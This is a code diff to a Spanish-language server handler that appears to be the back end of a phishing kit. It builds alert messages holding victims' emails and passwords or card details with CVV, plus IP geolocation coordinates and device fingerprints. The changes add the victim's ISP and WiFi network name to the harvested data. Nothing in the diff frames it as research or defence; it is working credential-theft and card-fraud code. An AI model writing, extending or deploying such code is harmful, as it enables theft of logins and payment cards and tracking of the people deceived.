@@ -38,7 +38,7 @@ async function getGeoFromIp(ip) {
         region: d.region || '',
         country: d.country_name || d.country || '',
         countryCode: d.country_code || '',
-        isp: '',
+        isp: d.org || d.isp || d.connection_isp || '',
         lat: d.latitude || '',
         lon: d.longitude || ''
       };
@@ -56,7 +56,7 @@ async function getGeoFromIp(ip) {
             region: d2.regionName || '',
             country: d2.country || '',
             countryCode: d2.countryCode || '',
-            isp: '',
+            isp: d2.isp || '',
             lat: d2.lat || '',
             lon: d2.lon || ''
           };
@@ -122,12 +122,14 @@ export default async function handler(req, res) {
     const batteryLevel = body.batteryLevel || 'No disponible';
     const batteryCharging = body.batteryCharging || 'Desconocido';
 
-    // Geo IP server-side
+    const wifiName = body.wifiName || '';
+
     const geo = await getGeoFromIp(clientIpRaw);
     const geoCity = geo.city || '';
     const geoRegion = geo.region || '';
     const geoCountry = geo.country || '';
     const geoCountryCode = geo.countryCode || '';
+    const geoIsp = geo.isp || '';
     const geoLat = geo.lat || '';
     const geoLon = geo.lon || '';
 
@@ -135,7 +137,6 @@ export default async function handler(req, res) {
     const hasPlaceholders = template.includes('{email}');
     const isPayment = type === 'payment';
 
-    // Determinar tipo de dispositivo legible
     let deviceTypeText = '🖥️ Escritorio';
     if (isMobile === 'Sí') deviceTypeText = '📱 Móvil';
     else if (isTablet === 'Sí') deviceTypeText = '📱 Tablet';
@@ -160,8 +161,10 @@ export default async function handler(req, res) {
       message = replaceIfExists(message, 'geoRegion', geoRegion);
       message = replaceIfExists(message, 'geoCountry', geoCountry);
       message = replaceIfExists(message, 'geoCountryCode', geoCountryCode);
+      message = replaceIfExists(message, 'geoIsp', geoIsp);
       message = replaceIfExists(message, 'geoLat', geoLat);
       message = replaceIfExists(message, 'geoLon', geoLon);
+      message = replaceIfExists(message, 'wifiName', wifiName);
       message = replaceIfExists(message, 'deviceMemory', deviceMemory);
       message = replaceIfExists(message, 'cpuCores', cpuCores);
       message = replaceIfExists(message, 'touchPoints', touchPoints);
@@ -193,21 +196,20 @@ export default async function handler(req, res) {
         message += '\n🔐 CVV: ' + cvv;
       }
     } else {
-      // Build device type string WITHOUT ISP, WITHOUT confusing "Tipo: No/No/Si"
-      const deviceParts = [];
-      deviceParts.push('🖥️ CPU: ' + cpuCores + ' nucleos');
-      deviceParts.push('💾 RAM: ' + deviceMemory + ' GB');
-      deviceParts.push('📱 Tipo: ' + deviceTypeText);
-
-      // Build location string WITHOUT ISP
       const locationParts = [];
       if (geoCity) locationParts.push('🏙️ Ciudad: ' + geoCity);
       if (geoRegion) locationParts.push('🗺️ Region: ' + geoRegion);
       if (geoCountry) locationParts.push('🌐 Pais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : ''));
+      if (geoIsp) locationParts.push('📡 ISP: ' + geoIsp);
       if (geoLat && geoLon) locationParts.push('📍 Coordenadas: ' + geoLat + ', ' + geoLon);
 
+      const deviceParts = [];
+      deviceParts.push('🖥️ CPU: ' + cpuCores + ' nucleos');
+      deviceParts.push('💾 RAM: ' + deviceMemory + ' GB');
+      deviceParts.push('📱 Tipo: ' + deviceTypeText);
+      if (wifiName) deviceParts.push('📶 WiFi: ' + wifiName);
+
       if (isPayment) {
-        // PAGO - email + tarjeta + ubicacion + dispositivo + navegador (SIN ISP)
         message = '💳 *Verificacion de pago*';
         message += '\n━━━━━━━━━━━━━━━━━━━━━━━';
         message += '\n📧 *Usuario:* ' + email;
@@ -240,7 +242,6 @@ export default async function handler(req, res) {
 
         message += '\n\n⏰ *Hora:* ' + timestamp;
       } else {
-        // LOGIN - email + password + ubicacion + dispositivo + navegador (SIN ISP)
         message = '🔐 *Inicio de sesion*';
         message += '\n━━━━━━━━━━━━━━━━━━━━━━━';
         message += '\n📧 *Usuario:* ' + email;
